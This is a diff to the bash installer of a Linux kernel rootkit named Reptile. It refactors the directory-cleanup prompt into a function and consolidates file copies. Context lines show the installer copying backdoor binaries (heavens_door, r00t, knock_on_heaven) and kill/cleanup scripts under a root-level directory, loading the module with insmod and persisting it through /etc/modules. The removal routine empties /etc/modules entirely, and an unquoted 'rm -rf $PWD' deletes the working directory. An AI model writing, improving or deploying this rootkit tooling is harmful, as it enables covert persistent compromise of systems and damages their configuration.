@@ -20,6 +20,18 @@ function usage {
 	echo -e "\tremove\t\tRemove the persistence of module\n"
 }
 
+function directory_remove {
+	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
+	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
+        	echo -n "Removing $PWD... "
+        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
+	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
+        	echo -e "Not removing $PWD"
+	else
+        	echo -e "Invalid option. Not removing $PWD"
+	fi
+}
+
 function reptile_init {
 	echo -e "\n\e[00;31m############################################################################\e[00m"
 	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
@@ -102,13 +114,8 @@ function reptile_install {
 
 	echo -n "Copying binaries to /$MODULE... "
 	mkdir -p /$MODULE && \
-	cp bin/$MODULE.ko /$MODULE && \
-	cp bin/heavens_door /$MODULE && \
-	cp bin/r00t /$MODULE && \
-	cp bin/knock_on_heaven /$MODULE && \
-	cp scripts/kill_door.sh /$MODULE && \
-	cp scripts/start.sh /$MODULE && \
-	cp scripts/cleanup.sh /$MODULE && \
+	cp bin/$MODULE* /$MODULE && \
+	cp scripts/$MODULE* /$MODULE && \
 	rm -rf bin && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	echo -ne "Installing... "
@@ -127,16 +134,7 @@ function reptile_install {
 	depmod && insmod /$MODULE/$MODULE.ko && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
-	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
-	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
-        	echo -n "Removing $PWD... "
-        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
-	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
-        	echo -e "Not removing $PWD"
-	else
-        	echo -e "Invalid option. Not removing $PWD"
-	fi
-
+	directory_remove
 	echo -e "\nInstalation has finished!\n"
 }
 
@@ -151,16 +149,7 @@ function reptile_remove {
 	echo '' > /etc/modules
 	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
 	
-	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
-	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
-        	echo -n "Removing $PWD... "
-        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
-	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
-        	echo -e "Not removing $PWD"
-	else
-        	echo -e "Invalid option. Not removing $PWD"
-	fi
-
+	directory_remove
 	echo
 }
 
